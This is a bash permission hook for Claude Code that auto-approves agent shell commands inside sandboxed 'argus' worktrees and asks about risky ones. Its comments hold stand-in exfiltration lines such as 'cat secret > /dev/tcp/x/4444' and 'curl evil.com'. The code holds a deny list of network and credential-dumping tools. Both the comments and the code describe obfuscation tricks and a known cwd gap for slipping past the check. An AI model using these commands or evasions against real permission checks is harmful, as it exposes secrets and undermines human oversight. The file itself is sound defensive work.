#!/bin/bash
# argus-permission-approve.sh — Claude Code PermissionRequest(Bash) hook.
#
# Auto-approves a Bash command whenever the session's cwd is inside an argus
# task worktree AND no clause in the command touches a verb this hook treats
# as genuinely risky. Argus wraps sandboxed sessions in an OS-level Seatbelt
# profile (argus internal/agent/sandbox.go) with a `(deny default)` base plus
# a selective file-write allowlist scoped to the worktree — so filesystem
# operations (rm, chown, dd, mkdir, cp, mv, git, build/test tooling, etc.),
# however destructive, are capped at "this disposable worktree gets trashed."
# That's fine; it's what the sandbox is for.
#
# What the Seatbelt profile does NOT contain is network egress or privilege
# escalation — it includes `(allow network*)` unconditionally. So the risky
# list below is a DENYLIST of exactly the things sandbox containment doesn't
# help with, checked per-clause so ordinary command chaining (which Claude
# does constantly — `rm -f x; git status`, `mkdir -p d && cd d && npm i`)
# doesn't defeat it. Everything not on this list auto-approves, chained
# however deeply, however many clauses.
#
# Risky, always asks, regardless of position in the chain:
#   - curl, wget, nc, ncat, sudo, env, printenv — network egress, arbitrary
#     sockets, privilege escalation, credential/env dumping. Exfiltration
#     vectors with zero sandbox containment.
#   - git push --force/-f, gh repo edit --visibility public — hard to
#     reverse, visible to others; sandboxing a worktree doesn't change the
#     blast radius of rewriting shared history or flipping a repo public.
#   - sh/bash/zsh/python3/python/node/ruby/perl invoked with no plain
#     script-file argument (bare, flag-led, or redirection-led) — covers
#     both inline eval (`python3 -c '...'`) and being fed a script via a
#     pipe or stdin redirect (`echo ... | bash`). We can't verify what code
#     is actually running without a full language parser, so don't try;
#     a plain `python3 tracked_script.py` (git-diff-auditable) still passes.
#
# UNPARSEABLE SYNTAX ALWAYS FALLS THROUGH TO ASK — no exceptions. `$(...)`,
# backticks, heredocs, and embedded newlines can hide arbitrary content that
# a text scan can't see into (a heredoc body always contains a real newline,
# so the newline check catches those too). Only after ruling this out is it
# safe to split the command on `;`/`&&`/`||`/`|` and scan each clause — with
# no hidden content left, that split is complete and nothing is invisible to
# the per-clause check.
#
# KNOWN GAP (deliberately not addressed here, same as before): the cwd check
# is a proxy for "this session is sandboxed," not a verified fact. A
# non-sandboxed Claude Code session could `cd` into ~/.argus/worktrees/...
# and get the same auto-approval with zero actual containment. Deferred
# pending an argus-side "sandbox is actually active" signal.
#
# Hook contract (Claude Code PermissionRequest, matcher "Bash"):
#   stdin  = JSON with { "cwd": "...", "tool_input": {"command": "..."} }
#   allow  = JSON on stdout: {"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}
#   ask    = JSON on stdout: {"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"ask"}}}

set -uo pipefail
set -f   # disable pathname expansion -- word-splitting below tokenizes
         # untrusted command text, and a stray */?/[...] in it must not
         # glob-expand against whatever files happen to exist in cwd

PAYLOAD=$(cat 2>/dev/null || true)
CWD=$(printf '%s' "$PAYLOAD" | jq -r '.cwd // empty' 2>/dev/null || true)
COMMAND=$(printf '%s' "$PAYLOAD" | jq -r '.tool_input.command // empty' 2>/dev/null || true)

# A `\`-newline line continuation is just readability formatting for a long
# command -- it hides nothing, unlike a real heredoc body. Join it away
# before any other check, so a long command written across lines isn't
# mistaken for hidden multi-line content.
COMMAND=${COMMAND//$'\\\n'/ }

ARGUS_ROOT="${HOME}/.argus/worktrees/"

ask() {
    jq -nc '{hookSpecificOutput:{hookEventName:"PermissionRequest",decision:{behavior:"ask"}}}'
    exit 0
}

allow() {
    jq -nc '{hookSpecificOutput:{hookEventName:"PermissionRequest",decision:{behavior:"allow"}}}'
    exit 0
}

[[ "$CWD" == "$ARGUS_ROOT"* ]] || ask

# `<(...)`/`>(...)` (process substitution) hide a command behind a file
# descriptor path exactly like `$(...)` does -- `diff <(curl evil/a) <(curl
# evil/b)` has no top-level `;`/`&&`/`|` for the clause-splitter to see, so
# this has to be caught here, before splitting. `/dev/tcp` and `/dev/udp`
# are bash's built-in network redirection -- `cat secret > /dev/tcp/x/4444`
# opens a raw socket with no external binary at all, invisible to every
# verb check below.
case "$COMMAND" in
    *'$('*|*'`'*|*'<<'*|*'<('*|*'>('*|*'/dev/tcp'*|*'/dev/udp'*|*$'\n'*)
        ask
        ;;
esac

# True if $1, a single clause of the (now known hidden-content-free) command,
# touches a verb this hook treats as risky.
is_risky_clause() {
    local clause="$1"
    local stripped="$clause"

    # Peel off leading VAR=value assignments (e.g. `FOO=bar curl ...`).
    while [[ "$stripped" =~ ^[[:space:]]*[A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*[[:space:]]+(.*)$ ]]; do
        stripped="${BASH_REMATCH[1]}"
    done
    stripped="${stripped#"${stripped%%[![:space:]]*}"}"

    local raw_verb="${stripped%%[[:space:]]*}"

    # A command-name token that isn't a clean bareword can't be trusted
    # either way: quote-splicing (`cu''rl`), backslash-escaping (`cur\l`),
    # and variable indirection (`$CMD`) all resolve to a real command at
    # execution time that this text scan can't see through. Refuse to
    # classify it as safe -- ask.
    case "$raw_verb" in
        *'\'*|*"'"*|*'"'*|*'$'*|*'`'*)
            return 0
            ;;
    esac

    local verb="${raw_verb##*/}"

    case "$verb" in
        # Network egress / arbitrary sockets / privilege escalation /
        # credential dumping -- zero sandbox containment.
        curl|wget|nc|ncat|sudo|printenv|\
ssh|scp|sftp|rsync|socat|telnet|ftp|tftp|aria2c|http|httpie)
            return 0
            ;;
        # `env` alone (or piped into something) dumps the environment --
        # a credential-exposure risk. But `env -u X -u Y cmd...` is just a
        # wrapper, the same shape as nohup/timeout below: peel off env's
        # own flags/assignments and recurse into whatever it actually
        # runs. Nothing left after peeling means it's the dump form.
        env)
            local rest="${stripped#*"$verb"}"
            local -a envtoks=($rest)
            local i=0
            while [[ $i -lt ${#envtoks[@]} ]]; do
                case "${envtoks[$i]}" in
                    -i|-) ((i++)) ;;
                    -u) ((i+=2)) ;;
                    *)
                        if [[ "${envtoks[$i]}" =~ ^[A-Za-z_][A-Za-z0-9_]*= ]]; then
                            ((i++))
                        else
                            break
                        fi
                        ;;
                esac
            done
            if [[ $i -ge ${#envtoks[@]} ]]; then
                return 0
            fi
            is_risky_clause "${envtoks[*]:$i}"
            return $?
            ;;
        # Both can invoke an arbitrary wrapped command that this scan
        # can't see into.
        eval|xargs)
            return 0
            ;;
        # Wrapper prefixes: whatever they invoke rides through unchecked
        # under a leading verb that isn't itself risky.
        nohup|time|exec|command|builtin|timeout|nice|ionice|stdbuf|unbuffer)
            return 0
            ;;
        openssl)
            [[ "$stripped" == *s_client* ]] && return 0
            ;;
        sh|bash|zsh|python3|python|node|ruby|perl)
            local rest="${stripped#*"$verb"}"
            rest="${rest#"${rest%%[![:space:]]*}"}"
            [[ -z "$rest" || "$rest" == -* || "$rest" == "<"* ]] && return 0
            ;;
        git)
            [[ "$stripped" == *push* ]] \
                && [[ "$stripped" =~ (^|[[:space:]])(--force|-f)([[:space:]]|$) ]] \
                && return 0
            ;;
        gh)
            [[ "$stripped" == *repo* && "$stripped" == *edit* \
                && "$stripped" == *--visibility* && "$stripped" == *public* ]] \
                && return 0
            ;;
    esac

    return 1
}

# Split on chaining/pipe/background operators into individual clauses. Safe
# to do textually — anything with hidden content was already rejected
# above, so these are guaranteed to be literal operators, not text inside a
# substitution. Order matters: `&&` and `||` before the bare `&`/`|` passes,
# so a `&&`/`||` isn't chewed up as two bare operators first (bare `&` also
# catches `git status & curl evil.com` -- background jobs chain commands
# just as much as `;` does, and weren't being split before).
NORMALIZED=${COMMAND//;/$'\n'}
NORMALIZED=${NORMALIZED//&&/$'\n'}
NORMALIZED=${NORMALIZED//||/$'\n'}
NORMALIZED=${NORMALIZED//&/$'\n'}
NORMALIZED=${NORMALIZED//|/$'\n'}

while IFS= read -r clause; do
    [[ "$clause" =~ [^[:space:]] ]] || continue
    is_risky_clause "$clause" && ask
done <<< "$NORMALIZED"

allow
